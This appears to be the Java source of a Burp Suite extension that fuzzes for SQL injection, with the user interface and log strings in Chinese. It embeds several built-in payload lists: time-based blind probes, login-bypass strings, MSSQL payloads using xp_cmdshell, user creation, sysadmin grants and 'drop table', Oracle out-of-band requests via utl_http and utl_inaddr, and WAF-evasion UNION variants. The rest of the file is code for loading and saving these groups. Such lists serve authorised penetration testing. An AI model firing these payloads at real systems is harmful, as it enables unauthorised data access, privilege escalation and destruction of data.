package utils;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import java.io.*;
import java.util.*;

/**
 * Payload管理工具类
 */
public class PayloadUtils {
    private final BurpExtender burpExtender;
    private final IBurpExtenderCallbacks callbacks;
    
    private String currentGroup = "default";
    private final List<String> payloadGroups = new ArrayList<>();
    private final Map<String, List<String>> groupPayloads = new HashMap<>();
    
    // default payload组
    private final String DEFAULT_PAYLOADS = 
        "'\n" +     
        "\"\n" +
        ",1\n" +
        ",0\n" +
        "'+Or+1=1+AND+'1'='1\n" +
        "'+Or+1=2+AND+'1'='1\n" +
        "'||1/1||'\n" +
        "'||1/0||'\n" +
        "'%df'+and+sleep(3)#\n" +
        "'and+'1'='1\n" +
        "+AND+1=1\n" +
        "+AND+sleep(5)\n" +
        "+AND+(SELECT+8778+FROM+(SELECT(SLEEP(5)))nXpZ)'\n" +
        "'||1=if(substr(database(),1,1)='1',exp(999),1)||'\n" +
        "'and(select*from(select+sleep(5))a/**/union/**/select+1)='\n" +
        "')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n" +
        "1');SELECT+SLEEP(5)#\n" +
        "';SELECT+SLEEP(5)#\n" +
        "(SELECT+6242+FROM+(SELECT(SLEEP(5)))MgdE)\n" +
        "(select*from(select+if(substr(database(),1,1)='j',exp(709),exp(710)))a)";
    
    // orderBy测试组 payload
    private final String ORDER_TEST_PAYLOADS = 
        ",1\n" +
        ",0\n" +
        ",(select sleep(5))";
    
    // blind-injection-fuzz payload组
    private final String BLIND_INJECTION_PAYLOADS = 
        "sleep(5)#\n" +
        "1 or sleep(5)#\n" +
        "\" or sleep(5)#\n" +
        "' or sleep(5)#\n" +
        "\" or sleep(5)=\"\n" +
        "' or sleep(5)='\n" +
        "1) or sleep(5)#\n" +
        "\") or sleep(5)=\"\n" +
        "') or sleep(5)='\n" +
        "1)) or sleep(5)#\n" +
        "\")) or sleep(5)=\"\n" +
        "')) or sleep(5)='\n" +
        ";waitfor delay '0:0:5'--\n" +
        ");waitfor delay '0:0:5'--\n" +
        "';waitfor delay '0:0:5'--\n" +
        "\";waitfor delay '0:0:5'--\n" +
        "');waitfor delay '0:0:5'--\n" +
        "\");waitfor delay '0:0:5'--\n" +
        "));waitfor delay '0:0:5'--\n" +
        "'));waitfor delay '0:0:5'--\n" +
        "\"));waitfor delay '0:0:5'--\n" +
        "benchmark(10000000,MD5(1))#\n" +
        "1 or benchmark(10000000,MD5(1))#\n" +
        "\" or benchmark(10000000,MD5(1))#\n" +
        "' or benchmark(10000000,MD5(1))#\n" +
        "1) or benchmark(10000000,MD5(1))#\n" +
        "\") or benchmark(10000000,MD5(1))#\n" +
        "') or benchmark(10000000,MD5(1))#\n" +
        "1)) or benchmark(10000000,MD5(1))#\n" +
        "\")) or benchmark(10000000,MD5(1))#\n" +
        "')) or benchmark(10000000,MD5(1))#\n" +
        "pg_sleep(5)--\n" +
        "1 or pg_sleep(5)--\n" +
        "\" or pg_sleep(5)--\n" +
        "' or pg_sleep(5)--\n" +
        "1) or pg_sleep(5)--\n" +
        "\") or pg_sleep(5)--\n" +
        "') or pg_sleep(5)--\n" +
        "1)) or pg_sleep(5)--\n" +
        "\")) or pg_sleep(5)--\n" +
        "')) or pg_sleep(5)--";
    
    // login-password-injection-fuzz payload组
    private final String LOGIN_PASSWORD_INJECTION_PAYLOADS = 
        "\"\n" +
        "\" or \"a\"=\"a\n" +
        "\" or \"x\"=\"x\n" +
        "admin' Or '1'!='1\n" +
        "admin\" Or \"1\"!=\"2\n" +
        "\" or 0=0 #\n" +
        "\" or 0=0 -- aassd\n" +
        "\" or 1=1 or \"\"=\"\n" +
        "\" or 1=1-- aassd \n" +
        "\"' or 1 -- aassd'\"\n" +
        "\") or (\"a\"=\"a\n" +
        "') or ('1')=('1')#\n" +
        "') or ('1')=('1')-- aassd s\n" +
        "or 1=1\n" +
        "or 1=1-- aassd\n" +
        "or 1=1#\n" +
        "or 1=1/*\n" +
        "admin' -- aassd\n" +
        "admin' #\n" +
        "admin'/*\n" +
        "admin' or '1'='1\n" +
        "admin' or '1'='1'-- aassd\n" +
        "admin' or '1'='1'#\n" +
        "admin' or '1'='1'/*\n" +
        "admin'or 1=1 or ''='\n" +
        "admin' or 1=1\n" +
        "admin' or 1=1-- aassd\n" +
        "admin' or 1=1#\n" +
        "admin' or 1=1/*\n" +
        "admin') or ('1'='1\n" +
        "admin') or ('1'='1'-- aassd\n" +
        "admin') or ('1'='1'#\n" +
        "admin') or ('1'='1'/*\n" +
        "admin') or '1'='1\n" +
        "admin') or '1'='1'-- aassd\n" +
        "admin') or '1'='1'#\n" +
        "admin') or '1'='1'/*\n" +
        "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\n" +
        "admin\" -- aassd\n" +
        "admin\" #\n" +
        "admin\"/*\n" +
        "admin\" or \"1\"=\"1\n" +
        "admin\" or \"1\"=\"1\"-- aassd\n" +
        "admin\" or \"1\"=\"1\"#\n" +
        "admin\" or \"1\"=\"1\"/*\n" +
        "admin\"or 1=1 or \"\"=\"\n" +
        "admin\" or 1=1\n" +
        "admin\" or 1=1-- aassd\n" +
        "admin\" or 1=1#\n" +
        "admin\" or 1=1/*\n" +
        "admin\") or (\"1\"=\"1\n" +
        "admin\") or (\"1\"=\"1\"-- aassd \n" +
        "admin\") or (\"1\"=\"1\"#\n" +
        "admin\") or (\"1\"=\"1\"/*\n" +
        "admin\") or \"1\"=\"1\n" +
        "admin\") or \"1\"=\"1\"-- aassd\n" +
        "admin\") or \"1\"=\"1\"#\n" +
        "admin\") or \"1\"=\"1\"/*\n" +
        "\"or \"a\"=\"a\n" +
        "')or('a'='a\n" +
        "'or 1=1-- aassd s\n" +
        "a'or' 1=1-- aassd \n" +
        "\"or 1=1-- aassd\n" +
        "'or'a'='a\n" +
        "\"or\"=\"a'='a\n" +
        "'or''='\n" +
        "'or'='or'\n" +
        "1 or '1'='1'=1\n" +
        "1 or '1'='1' or 1=1\n" +
        "'OR 1=1%00\n" +
        "\"or 1=1%00\n" +
        "'xor";
    
    // mssql-payloads-fuzz payload组 (截取部分，完整版太长)
    private final String MSSQL_PAYLOADS = 
        "'; exec master..xp_cmdshell 'ping 10.10.1.2'--\n" +
        "'create user name identified by 'pass123' --\n" +
        "' ; drop table temp --\n" +
        "'exec sp_addlogin 'name' , 'password' --\n" +
        "' exec sp_addsrvrolemember 'name' , 'sysadmin' --\n" +
        "' or 1=1 --\n" +
        "' union (select @@version) --\n" +
        "' union (select NULL, (select @@version)) --\n" +
        "' union (select NULL, NULL, (select @@version)) --\n" +
        "' union (select NULL, NULL, NULL,  (select @@version)) --\n" +
        "'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --\n" +
        "'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --\n" +
        "'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --\n" +
        "'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --";
    
    // oracle-payloads-fuzz payload组 (截取部分)
    private final String ORACLE_PAYLOADS = 
        "' or '1'='1\n" +
        "'||utl_http.request('httP://192.168.1.1/')||'\n" +
        "' || myappadmin.adduser('admin', 'newpass') || '\n" +
        "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i\n" +
        "' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i\n" +
        "' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i\n" +
        "' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i\n" +
        "' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i";
    
    // union-select-bypass payload组 (截取部分)
    private final String UNION_SELECT_BYPASS_PAYLOADS = 
        "/*!50000%55nIoN*/ /*!50000%53eLeCt*/\n" +
        "%55nion(%53elect 1,2,3)-- -\n" +
        "+union+distinct+select+\n" +
        "+union+distinctROW+select+\n" +
        "/**//*!12345UNION SELECT*//**/\n" +
        "/**//*!50000UNION SELECT*//**/\n" +
        "/**/UNION/**//*!50000SELECT*//**/\n" +
        "/*!50000UniON SeLeCt*/\n" +
        "union /*!50000%53elect*/\n" +
        "+ #?uNiOn + #?sEleCt\n" +
        "/*!%55NiOn*/ /*!%53eLEct*/\n" +
        "/*!u%6eion*/ /*!se%6cect*/\n" +
        "+un/**/ion+se/**/lect\n" +
        "uni%0bon+se%0blect\n" +
        "%2f**%2funion%2f**%2fselect\n" +
        "union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A\n" +
        "REVERSE(noinu)+REVERSE(tceles)\n" +
        "/*--*/union/*--*/select/*--*/\n" +
        "union (/*!/**/ SeleCT */ 1,2,3)\n" +
        "/*!union*/+/*!select*/\n" +
        "union+/*!select*/\n" +
        "/**/union/**/select/**/\n" +
        "/**/uNIon/**/sEleCt/**/\n" +
        "+%2F**/+Union/*!select*/\n" +
        "/**//*!union*//**//*!select*//**/\n" +
        "/*!uNIOn*/ /*!SelECt*/\n" +
        "+union+distinct+select+\n" +
        "+union+distinctROW+select+\n" +
        "uNiOn aLl sElEcT\n" +
        "UNIunionON+SELselectECT";
    
    public PayloadUtils(BurpExtender burpExtender) {
        this.burpExtender = burpExtender;
        this.callbacks = burpExtender.callbacks;
        
        initializePayloadGroups();
    }
    
    /**
     * 初始化Payload组
     */
    private void initializePayloadGroups() {
        payloadGroups.clear();
        groupPayloads.clear();
        
        // 添加所有内置组
        payloadGroups.add("default");
        payloadGroups.add("orderBy测试组");
        payloadGroups.add("blind-injection-fuzz");
        payloadGroups.add("login-password-injection-fuzz");
        payloadGroups.add("mssql-payloads-fuzz");
        payloadGroups.add("oracle-payloads-fuzz");
        payloadGroups.add("union-select-bypass");
        
        // 加载保存的组配置
        loadPayloadGroups();
        
        // 加载所有内置组的payload
        loadPayloadGroup("default");
        loadPayloadGroup("orderBy测试组");
        loadPayloadGroup("blind-injection-fuzz");
        loadPayloadGroup("login-password-injection-fuzz");
        loadPayloadGroup("mssql-payloads-fuzz");
        loadPayloadGroup("oracle-payloads-fuzz");
        loadPayloadGroup("union-select-bypass");
        
        // 扫描其他组
        scanForPayloadGroups();
        
        callbacks.printOutput("已初始化payload组，共" + payloadGroups.size() + "个组: " + payloadGroups);
    }
    
    /**
     * 扫描Payload组文件
     */
    private void scanForPayloadGroups() {
        // 暂时只保留默认组，避免混乱
        // 用户可以通过UI手动添加其他组
        //callbacks.printOutput("当前只有默认组，用户可通过UI添加其他组");
    }
    
    /**
     * 加载指定组的Payload
     */
    private void loadPayloadGroup(String groupName) {
        List<String> payloads = new ArrayList<>();
        
        // 尝试从文件加载
        String filename = getPayloadFileName(groupName);
        try (BufferedReader reader = new BufferedReader(new FileReader(filename))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty() && !line.startsWith("#")) { // 跳过注释行
                    payloads.add(line);
                }
            }
           
        } catch (IOException e) {
            // 文件不存在，使用内置的默认payload
            if ("default".equals(groupName)) {
                payloads = Arrays.asList(DEFAULT_PAYLOADS.split("\n"));
            } else if ("orderBy测试组".equals(groupName)) {
                payloads = Arrays.asList(ORDER_TEST_PAYLOADS.split("\n"));
            } else if ("blind-injection-fuzz".equals(groupName)) {
                payloads = Arrays.asList(BLIND_INJECTION_PAYLOADS.split("\n"));
            } else if ("login-password-injection-fuzz".equals(groupName)) {
                payloads = Arrays.asList(LOGIN_PASSWORD_INJECTION_PAYLOADS.split("\n"));
            } else if ("mssql-payloads-fuzz".equals(groupName)) {
                payloads = Arrays.asList(MSSQL_PAYLOADS.split("\n"));
            } else if ("oracle-payloads-fuzz".equals(groupName)) {
                payloads = Arrays.asList(ORACLE_PAYLOADS.split("\n"));
            } else if ("union-select-bypass".equals(groupName)) {
                payloads = Arrays.asList(UNION_SELECT_BYPASS_PAYLOADS.split("\n"));
            } else {
                // 其他组使用default的payload
                payloads = Arrays.asList(DEFAULT_PAYLOADS.split("\n"));
            }
        }
        
        groupPayloads.put(groupName, payloads);
    }
    
    /**
     * 获取Payload文件名
     */
    private String getPayloadFileName(String groupName) {
        String configDir = getConfigDirectory();
        if ("default".equals(groupName)) {
            return configDir + "/xia_SQL_diy_payload_default.ini";
        } else if ("orderBy测试组".equals(groupName)) {
            return configDir + "/xia_SQL_payload_orderby.ini";
        } else if ("blind-injection-fuzz".equals(groupName)) {
            return configDir + "/xia_SQL_payload_blind-injection-fuzz.ini";
        } else if ("login-password-injection-fuzz".equals(groupName)) {
            return configDir + "/xia_SQL_payload_login-password-injection-fuzz.ini";
        } else if ("mssql-payloads-fuzz".equals(groupName)) {
            return configDir + "/xia_SQL_payload_mssql-payloads-fuzz.ini";
        } else if ("oracle-payloads-fuzz".equals(groupName)) {
            return configDir + "/xia_SQL_payload_oracle-payloads-fuzz.ini";
        } else if ("union-select-bypass".equals(groupName)) {
            return configDir + "/xia_SQL_payload_union-select-bypass.ini";
        } else {
            return configDir + "/xia_SQL_payload_" + groupName + ".ini";
        }
    }
    
    /**
     * 获取配置目录
     */
    private String getConfigDirectory() {
        // 简化实现，使用用户主目录
        return System.getProperty("user.home") + "/dousql";
    }
    
    /**
     * 获取当前组的Payload
     */
    public List<String> getCurrentPayloads() {
        return groupPayloads.getOrDefault(currentGroup, Arrays.asList(DEFAULT_PAYLOADS.split("\n")));
    }
    
    /**
     * 切换到指定组
     */
    public void switchToGroup(String groupName) {
        if (payloadGroups.contains(groupName)) {
            this.currentGroup = groupName;
            
            
            // 确保组的payload已加载
            if (!groupPayloads.containsKey(groupName)) {
                loadPayloadGroup(groupName);
            }
        } else {
            callbacks.printError("Payload组不存在: " + groupName);
        }
    }
    
    /**
     * 获取当前组名
     */
    public String getCurrentGroup() {
        return currentGroup;
    }
    
    /**
     * 获取所有组名
     */
    public List<String> getPayloadGroups() {
        return new ArrayList<>(payloadGroups);
    }
    
    /**
     * 重新加载Payload
     */
    public void reloadPayloads() {
        loadPayloadGroup(currentGroup);
       
    }
    
    /**
     * 添加新的Payload组
     */
    public boolean addPayloadGroup(String groupName) {
        if (groupName == null || groupName.trim().isEmpty()) {
            callbacks.printError("组名不能为空");
            return false;
        }
        
        groupName = groupName.trim();
        if (payloadGroups.contains(groupName)) {
            callbacks.printError("组名已存在: " + groupName);
            return false;
        }
        
        // 添加到组列表
        payloadGroups.add(groupName);
        
        // 创建空的payload列表
        groupPayloads.put(groupName, new ArrayList<>());
        
        // 保存组配置到文件
        savePayloadGroups();
        
       
        return true;
    }
    
    /**
     * 重命名Payload组
     */
    public boolean renamePayloadGroup(String oldName, String newName) {
        if (oldName == null || newName == null || oldName.trim().isEmpty() || newName.trim().isEmpty()) {
            callbacks.printError("组名不能为空");
            return false;
        }
        
        oldName = oldName.trim();
        newName = newName.trim();
        
        if (!payloadGroups.contains(oldName)) {
            callbacks.printError("原组名不存在: " + oldName);
            return false;
        }
        
        if (payloadGroups.contains(newName)) {
            callbacks.printError("新组名已存在: " + newName);
            return false;
        }
        
        // 更新组列表
        int index = payloadGroups.indexOf(oldName);
        payloadGroups.set(index, newName);
        
        // 更新payload映射
        List<String> payloads = groupPayloads.remove(oldName);
        groupPayloads.put(newName, payloads);
        
        // 如果当前组是被重命名的组，更新当前组名
        if (currentGroup.equals(oldName)) {
            currentGroup = newName;
        }
        
        // 保存组配置
        savePayloadGroups();
        
        callbacks.printOutput("已重命名payload组: " + oldName + " -> " + newName);
        return true;
    }
    
    /**
     * 删除Payload组
     */
    public boolean deletePayloadGroup(String groupName) {
        if (groupName == null || groupName.trim().isEmpty()) {
            callbacks.printError("组名不能为空");
            return false;
        }
        
        groupName = groupName.trim();
        
        if ("default".equals(groupName)) {
            callbacks.printError("不能删除默认组");
            return false;
        }
        
        if (!payloadGroups.contains(groupName)) {
            callbacks.printError("组名不存在: " + groupName);
            return false;
        }
        
        // 从组列表中移除
        payloadGroups.remove(groupName);
        groupPayloads.remove(groupName);
        
        // 如果当前组被删除，切换到默认组
        if (currentGroup.equals(groupName)) {
            currentGroup = "default";
        }
        
        // 保存组配置
        savePayloadGroups();
        
        
        return true;
    }
    
    /**
     * 保存当前组的Payload
     */
    public void saveCurrentGroupPayloads(String payloadContent) {
        String filename = getPayloadFileName(currentGroup);
        
        try {
            // 确保目录存在
            File file = new File(filename);
            file.getParentFile().mkdirs();
            
            try (BufferedWriter writer = new BufferedWriter(new FileWriter(filename))) {
                writer.write(payloadContent);
            }
            
            // 重新加载
            loadPayloadGroup(currentGroup);

        } catch (IOException e) {
            callbacks.printError("保存payload失败: " + e.getMessage());
        }
    }
    
    /**
     * 重置当前组为默认payload
     */
    public void resetCurrentGroupToDefault() {
        List<String> defaultPayloads = Arrays.asList(DEFAULT_PAYLOADS.split("\n"));
        groupPayloads.put(currentGroup, new ArrayList<>(defaultPayloads));
        
    }
    
    /**
     * 保存Payload组配置到文件
     */
    private void savePayloadGroups() {
        try {
            String configFile = getConfigDirectory() + "/payload_groups.ini";
            
            // 确保目录存在
            File file = new File(configFile);
            file.getParentFile().mkdirs();
            
            try (BufferedWriter writer = new BufferedWriter(new FileWriter(configFile))) {
                // 保存组列表
                writer.write("# Payload组配置文件\n");
                writer.write("# 格式: [组名]\n");
                writer.write("# 当前组: " + currentGroup + "\n");
                writer.write("\n");
                
                for (String group : payloadGroups) {
                    writer.write("[" + group + "]\n");
                }
                
                writer.flush();
            }
            

            
        } catch (IOException e) {
            callbacks.printError("保存Payload组配置失败: " + e.getMessage());
        }
    }
    
    /**
     * 加载Payload组配置
     */
    private void loadPayloadGroups() {
        try {
            String configFile = getConfigDirectory() + "/payload_groups.ini";
            File file = new File(configFile);
            
            if (!file.exists()) {
                callbacks.printOutput("Payload组配置文件不存在，使用默认配置");
                return;
            }
            
            try (BufferedReader reader = new BufferedReader(new FileReader(configFile))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    line = line.trim();
                    if (line.startsWith("[") && line.endsWith("]")) {
                        String groupName = line.substring(1, line.length() - 1);
                        if (!payloadGroups.contains(groupName)) {
                            payloadGroups.add(groupName);
                        
                        }
                    }
                }
            }
            
            callbacks.printOutput("Payload组配置加载完成，共" + payloadGroups.size() + "个组");
            
        } catch (IOException e) {
            callbacks.printError("加载Payload组配置失败: " + e.getMessage());
        }
    }
}